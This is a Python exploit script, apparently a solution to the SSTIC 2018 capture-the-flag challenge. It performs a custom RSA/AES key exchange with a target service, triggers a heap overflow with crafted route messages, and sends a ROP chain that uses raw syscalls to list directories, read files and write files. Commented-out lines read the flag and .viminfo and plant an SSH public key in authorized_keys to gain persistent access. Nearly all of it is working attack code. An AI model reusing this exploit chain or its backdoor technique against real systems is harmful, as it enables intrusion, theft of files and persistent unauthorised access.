import struct
import sys
import gmpy
from pwn import *
from polytools import *
import os
import time
import random
import math
import sys
from Crypto.PublicKey import RSA
from Crypto import Random
from r4aes import AES_128
from struct import pack,unpack

target = ["127.0.0.1", 36735]
#target = ["195.154.105.12", 36735]

# 0x0000000000454e8c : pop rax ; ret
pop_rax = 0x0000000000454e8c
# 0x0000000000400766 : pop rdi ; ret
pop_rdi = 0x0000000000400766
# 0x00000000004017dc : pop rsi ; ret
pop_rsi = 0x00000000004017dc
# 0x00000000004573d5 : pop rdx ; ret
pop_rdx = 0x00000000004573d5
# 0x0000000000408f59 : pop rcx ; ret
pop_rcx = 0x0000000000408f59
# 0x000000000047fa05 : syscall ; ret
syscall = 0x000000000047fa05
# 0x000000000040f444 : mov rax, r8 ; ret
mov_rax_r8 = 0x000000000040f444
# 0x0000000000447618 : sub rax, rdi ; ret
sub_rax_rdi = 0x0000000000447618
# 0x0000000000401dcc : mov edx, eax ; add rsp, 8 ; mov eax, edx ; pop rbx ; pop rbp ; ret
mov_edx_eax_add_rsp_8_pop_rbx_pop_rbp = 0x0000000000401dcc
# 0x00000000004ac0e4 : push rdx ; mov edi, 0x23236595 ; pop rsi ; ret
push_rdx_pop_rsi = 0x00000000004ac0e4
# 0x000000000041c052 : mov rax, rsi ; ret
mov_rax_rsi = 0x000000000041c052
#0x000000000044b050 : mov qword ptr [rcx], rdx ; ret
save_rdx_at_rcx = 0x000000000044b050
bss = 0x6D9300

def print_ascii_file(data):
	print "-"*72
	filedata=""
	while data[0] != "\x00" and len(data) > 1:
		filedata+=data[0]
		data=data[1:]
	print filedata
	print "-"*72

def parse_fstat(data):
	print "-"*72
	mode = unpack("<I",data[0x18:0x1C])[0] & 0x1FF
	uid = unpack("<I",data[0x1C:0x20])[0]
	gid = unpack("<I",data[0x20:0x24])[0]


	m_print = ""
	for i in range(9):
		c="."
		if i % 3 == 0:
			c="r"
		elif i % 3 == 1:
			c="w"
		elif i % 3 == 2:
			c="x"
		if mode & 1<<(8-i):
			m_print+=c
		else:
			m_print+="."
	print "uid=%d, gid=%d, mode=%s" % (uid, gid, m_print)
	print "-"*72


def parse_getdents(data):
	print "-"*72
	while len(data) > 19:
		inode,data = unpack("<Q",data[:8])[0],data[8:]
		d_off,data = unpack("<Q",data[:8])[0],data[8:]
		d_reclen,data = unpack("<H",data[:2])[0],data[2:]
		dirent_data,data = data[:d_reclen-18], data[d_reclen-18:]
		name=""
		while dirent_data[0] != "\x00":
			name+=dirent_data[0]
			dirent_data=dirent_data[1:]
		ftype = ord(dirent_data[-1])
		if inode:
			ftype_name="unk"
			if ftype == 8:
				ftype_name="regular"
			elif ftype == 4:
				ftype_name="directory"
			elif ftype == 1:
				ftype_name="fifo"
			elif ftype == 12:
				ftype_name="socket"
			elif ftype == 10:
				ftype_name="symlink"
			elif ftype == 6:
				ftype_name="block dev"
			elif ftype == 2:
				ftype_name="char dev"
			print "%d\t%s\t%s" % (inode,ftype_name,name)
	print "-"*72

def add_string(addr,sti):
	out=""
	sti=sti+"\x00"
	c_addr = addr
	for i in range(0,len(sti),8):
		blc = sti[i:i+8]
		blc = blc + ("\x00" * (8-len(blc)))
		val = struct.unpack("<Q",blc)[0]
		out += p64(pop_rdx)
		out += p64(val)
		out += p64(pop_rcx)
		out += p64(c_addr)
		out += p64(save_rdx_at_rcx)
		c_addr += 8
	return out

def syscall_write(fd, buf, size):
	ret=""
	ret+=p64(pop_rax) # syscall id
	ret+=p64(1)
	ret+=p64(pop_rdi) # fd
	ret+=p64(fd)
	ret+=p64(pop_rsi) # buff
	ret+=p64(buf)
	ret+=p64(pop_rdx) # size
	ret+=p64(size)
	ret+=p64(syscall)
	return ret

def fstat(filename):
	ret=""

	ret += add_string(bss,filename)


	ret+=p64(pop_rax) # syscall id
	ret+=p64(2)       # open
	ret+=p64(pop_rdi) # filename
	ret+=p64(bss)
	ret+=p64(pop_rsi) # flags
	ret+=p64(0)        # O_RDONLY
	ret+=p64(syscall)

	# fd is 10 maybe ...
	ret+=p64(pop_rax) # syscall id
	ret+=p64(5)       # fstat
	ret+=p64(pop_rdi) # fd
	ret+=p64(10)
	ret+=p64(pop_rsi) # buff
	ret+=p64(bss)
	ret+=p64(syscall)

	ret += syscall_write(5,bss,1024)

	ret += p64(0x133333333337)
	return ret

def read_dir(directory):
	ret=""

	ret += add_string(bss,directory)


	ret+=p64(pop_rax) # syscall id
	ret+=p64(2)       # open
	ret+=p64(pop_rdi) # filename
	ret+=p64(bss)
	ret+=p64(pop_rsi) # flags
	ret+=p64(65536)        # O_RDONLY | O_DIRECTORY
	ret+=p64(syscall)

	# fd is 10 maybe ...
	ret+=p64(pop_rax) # syscall id
	ret+=p64(78)       # open
	ret+=p64(pop_rdi) # fd
	ret+=p64(10)
	ret+=p64(pop_rsi) # buff
	ret+=p64(bss)     
	ret+=p64(pop_rdx) # size
	ret+=p64(1024)
	ret+=p64(syscall)

	ret += syscall_write(5,bss,1024)

	ret += p64(0x133333333337)
	return ret

def save_file(filename,data):
	ret=""

	ret += add_string(bss,filename)


	ret+=p64(pop_rax) # syscall id
	ret+=p64(2)       # open
	ret+=p64(pop_rdi) # filename
	ret+=p64(bss)
	ret+=p64(pop_rsi) # flags
	ret+=p64(65)        # O_WRONLY | O_CREAT
	ret+=p64(pop_rdx) # flags
	ret+=p64(0x180)        # 644
	ret+=p64(syscall)

	ret += add_string(bss,data)

	# fd is 10 maybe ...
	ret+=p64(pop_rax) # syscall id
	ret+=p64(1)       # write
	ret+=p64(pop_rdi) # fd
	ret+=p64(10)
	ret+=p64(pop_rsi) # buff
	ret+=p64(bss)
	ret+=p64(pop_rdx) # size
	ret+=p64(len(data))
	ret+=p64(syscall)

	ret += syscall_write(5,bss,1024)

	ret += p64(0x133333333337)
	return ret

def read_file(filename):
	ret=""

	ret += add_string(bss,filename)


	ret+=p64(pop_rax) # syscall id
	ret+=p64(2)       # open
	ret+=p64(pop_rdi) # filename
	ret+=p64(bss)
	ret+=p64(pop_rsi) # flags
	ret+=p64(0)        # O_RDONLY
	ret+=p64(syscall)

	# fd is 10 maybe ...
	ret+=p64(pop_rax) # syscall id
	ret+=p64(0)       # read
	ret+=p64(pop_rdi) # fd
	ret+=p64(10)
	ret+=p64(pop_rsi) # buff
	ret+=p64(bss)
	ret+=p64(pop_rdx) # size
	ret+=p64(1024)
	ret+=p64(syscall)

	ret += syscall_write(5,bss,1024)

	ret += p64(0x133333333337)
	return ret



def dump_heap(fd, size):
	ret=""

	ret += p64(mov_rax_r8) # r8 = 0x1d1d968 heap = 0x1d19000    r8 = 0x1b408e8 heap = 0x1b3c000
	ret += p64(pop_rdi)
	ret += p64(0x1b408e8 - 0x1b3c000)
	ret += p64(sub_rax_rdi)

	ret += p64(mov_edx_eax_add_rsp_8_pop_rbx_pop_rbp)
	ret += p64(0) # not used
	ret += p64(0) # rbx
	ret += p64(0) # rbp
	ret += p64(push_rdx_pop_rsi)
	


	ret += p64(pop_rax)
	ret += p64(1)
	ret += p64(pop_rdi)
	ret += p64(fd)
	ret += p64(pop_rdx)
	ret += p64(size)
	ret += p64(syscall)
	
	ret += p64(0x133333333337)
	return ret

def dump_dir(fd, size):
	ret=""

	ret += p64(mov_rax_r8) # r8 = 0x1d1d968 heap = 0x1d19000    r8 = 0x1b408e8 heap = 0x1b3c000
	ret += p64(pop_rdi)
	ret += p64(0x1b408e8 - 0x1b3c000)
	ret += p64(sub_rax_rdi)

	ret += p64(mov_edx_eax_add_rsp_8_pop_rbx_pop_rbp)
	ret += p64(0) # not used
	ret += p64(0) # rbx
	ret += p64(0) # rbp
	ret += p64(push_rdx_pop_rsi)

	ret += p64(pop_rax)
	ret += p64(1)
	ret += p64(pop_rdi)
	ret += p64(fd)
	ret += p64(pop_rdx)
	ret += p64(size)
	ret += p64(syscall)
	ret += p64(0x133333333337)
	return ret




random_generator = Random.new().read
key = RSA.generate(2048, random_generator)
public_key = key.publickey()

class Client:
	def __init__(self, id):
		self.client_rsa_key = RSA.generate(2048, random_generator)
		self.server_rsa_key = None
		self.client_aes_key = "AABBCCDDEEFF11223344556677889900".decode("hex")
		self.server_aes_key = None
		self.crypt_client = AES_128()
		self.crypt_server = AES_128()
		self.id = id
		self.sock = remote(target[0], target[1])

	def disconnect(self):
		self.send_quit()
		self.sock.close()

	def perform_key_exchange(self):
		rsa_key_message = "\x00\x02"
		rsa_key_message += os.urandom(0x100 - 3 - 16)
		rsa_key_message += "\x00"
		rsa_key_message += self.client_aes_key

		my_n = hex(self.client_rsa_key.n).replace("0x","").replace("L","").decode("hex")
		self.sock.send(my_n)

		data = self.sock.read(0x100)
		r_n = int(data.encode("hex"), 16)

		self.server_rsa_key = RSA.construct((long(r_n),long(0x10001)))
		enc_rsa_key = self.server_rsa_key.encrypt(rsa_key_message,32)[0]

		self.sock.send(enc_rsa_key)
		data = self.sock.read(0x100)

		dec_rsa_remote_aes_key = self.client_rsa_key.decrypt(data)
		if dec_rsa_remote_aes_key.startswith("\x02"):
			self.server_aes_key = dec_rsa_remote_aes_key[-16:]
		else:
			error("Bad key exchange")
			return

		ok("KEY exchange complete !")
		ok("Local  key : %s" % self.client_aes_key.encode("hex"))
		ok("Remote key : %s" % self.server_aes_key.encode("hex"))

		self.crypt_client.key = self.client_aes_key
		self.crypt_server.key = self.server_aes_key

	def encrypt(self,payload):
		iv = "\x00" * 16
		message = iv
		for i in range(0,len(payload),16):
			clear_bloc = payload[i:i+16]
			enc_bloc   = self.crypt_server.cipher(xor(clear_bloc,iv))
			iv = enc_bloc
			message +=  enc_bloc
		return message

	def decrypt(self,payload):
		iv = payload[:16]
		payload = payload[16:]
		message=""
		for i in range(0,len(payload),16):
			ciphertext_bloc = payload[i:i+16]
			dec_bloc   = xor(self.crypt_client.inv_cipher(ciphertext_bloc),iv)
			iv = ciphertext_bloc
			message +=  dec_bloc
		return message

	def send_payload(self,payload):
		encrypted = self.encrypt(payload)
		self.sock.send(struct.pack("<I",len(encrypted)))
		self.sock.send(encrypted)
		time.sleep(0.1)
	
	def recv_payload(self):
		data_len = self.sock.read(4)
		data_len = struct.unpack("<I",data_len)[0]
		data=""
		while len(data) != data_len:
			data += self.sock.read(data_len)
		return self.decrypt(data)

	def send_quit(self):
		info("send quit to client %016lx" % (self.id))
		payload =""
		payload += "41 41 41 41 de c0 d3 d1 63 65 71 65 6a 65 76 65".replace(" ","").decode("hex")
		payload += struct.pack("<Q", self.id)
		payload += "00 00 00 00 00 00 00 00".replace(" ","").decode("hex")
		payload += "04 02 00 05 28 00 00 00 00 00 00 00 00 00 00 00".replace(" ","").decode("hex")
		self.send_payload(payload)

	def send_hello(self):
		info("send hello to client %016lx" % (self.id))
		payload =""
		payload += "41 41 41 41 de c0 d3 d1 63 65 71 65 6a 65 76 65".replace(" ","").decode("hex")
		payload += struct.pack("<Q", self.id)
		payload += "00 00 00 00 00 00 00 00".replace(" ","").decode("hex")
		payload += "00 00 01 01 28 00 00 00 00 00 00 00 00 00 00 00".replace(" ","").decode("hex")
		self.send_payload(payload)

	def create_route(self,route):
		info("send create route to client %016lx" % (self.id))
		route = struct.pack("<Q", route)
		payload =""
		payload += "41 41 41 41 de c0 d3 d1 63 65 71 65 6a 65 76 65".replace(" ","").decode("hex")
		payload += route
		payload += "00 00 00 00 00 00 00 00".replace(" ","").decode("hex")
		payload += "00 00 01 01 28 00 00 00 00 00 00 00 00 00 00 00".replace(" ","").decode("hex")
		self.send_payload(payload)

	def send_raw(self,raw):
		info("send raw data to client %016lx" % (self.id))
		payload =raw
		self.send_payload(payload)

# c4 = Client(0x4444444444444444)
# c4.perform_key_exchange()
# c4.send_hello()
# c4.send_cmd("ls -la /")
# c4.recv_payload()

# sys.exit(0)

cl=[]


for i in range(8):
	c1 = Client(0x444444444444000+i)
	c1.perform_key_exchange()
	c1.send_hello()
	c1.recv_payload()
	if i == 5:
		for j in range(11):
			c1.create_route(0x1337000000000000 + (i<<8) + j)
	cl.append(c1)


client_overflow_route = cl[5]
client_to_delete = cl[6]

time.sleep(1)

client_overflow_route.create_route(0x240*2+0x110+0x40*2+1)


client_to_delete.disconnect()
client_overflow_route.create_route(0xbadbabe)

#for i in range(1,0xe):
#	cl[i].disconnect()
#
#time.sleep(1)

client_overflow_route.create_route(0xAAAAAAAA) # realloc here
client_overflow_route.create_route(0xBBBBBBBB)
client_overflow_route.create_route(0xCCCCCCCC)
client_overflow_route.create_route(0xDDDDDDDD)
for i in range(0x200 / 8):
	client_overflow_route.create_route(0x1db61-i)

client_overflow_route.create_route(0xB0 + 0x2b0)
client_overflow_route.create_route(8)
client_overflow_route.create_route(0x201)
client_overflow_route.create_route(0x0000000600000006)
client_overflow_route.create_route(0x6D7040 - (0x6*8))


cl[0].create_route(0x401491)

rop = ""
parser = hexdump
#rop += dump_heap(5,0x23000)

rop += read_dir("/home/sstic/")
parser = parse_getdents

#rop += fstat("/home/sstic/.ssh")
#parser = parse_fstat

#rop += save_file("/home/sstic/.ssh/authorized_keys2","ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbCZKZBdwFp/SQ5xihWKw6PJz6OLzCHMiIUYPQLHAZ04hR+mkQ7t6sH5OqI9SXAfELeYDHm5kLkSs9E+hi+kADV0B/xV9bdftgXdiRXtd2FBbAHSbXBpXJMatgD17VLCnpF2DMbJgMR8gywbyMITsnQz+Q5InpnfrdMGcuCR9F5+2fKZHIM+uQxnzDqwGGftihCPpFMHl/G43KTO8eauKQbeVOS8mJ4cCSAU/xWaODvpqqxdoRxMVGKLsQ26TvLXe7MnRN0v9iZBHuLa9pebiGrMjLHYev/dv24ebnmKDnO/1NRbFnUChKrgu3jZhpVtQ9JJ7EGKgmc7/5I6lZaUQL\n")

#rop += read_file("/home/sstic/secret/sstic2018.flag")
#parser = print_ascii_file

#rop += read_file("/home/sstic/.viminfo")
#parser = hexdump



cl[1].send_raw(rop)

data = ""
heap = open("heap.bin","wb")
while True:
	try:
		data = cl[1].sock.read(0x23000)
		heap.write(data)
	except:
		break
parser(data)
